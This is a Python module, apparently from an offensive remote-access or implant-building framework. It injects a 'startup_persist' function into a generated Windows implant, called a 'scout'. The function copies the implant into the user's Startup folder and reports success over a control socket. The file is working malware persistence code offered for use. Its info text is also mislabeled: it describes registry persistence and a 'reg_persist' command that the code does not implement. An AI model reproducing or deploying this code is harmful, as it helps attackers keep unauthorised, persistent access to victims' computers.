import library.modules.config as config

config.main()


def main(option):
    if option == 'generate':
        config.import_statements.append('from shutil import copy')
        config.import_statements.append('from os import path, getcwd')
        config.import_statements.append('from sys import argv')
        config.import_statements.append('from getpass import getuser')
        config.functions.append('''
def startup_persist(filepath):
        copy(filepath, 'C:\\\\Users\\\\' + getuser() + '\\\\AppData\\\\Roaming\\\\Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\Startup\\\\' + path.basename(argv[0]))
        s.sendall('[+]Persistence via startup folder achieved'.encode())''')
        config.logics.append('''
            elif command == "startup_persist":
                startup_persist(path.join(getcwd(),path.abspath(argv[0])))''')
        config.help_menu[
            'startup_persist'] = 'This module copies the scout to the windows startup folder'
    elif option == 'info':
        print('\nName             : Registry Persistence component' \
              '\nOS               : Windows' \
              '\nRequired Modules : shutil, sys, os' \
              '\nCommands         : reg_persist' \
              '\nDescription      : This module copies the scout to the windows startup folder')
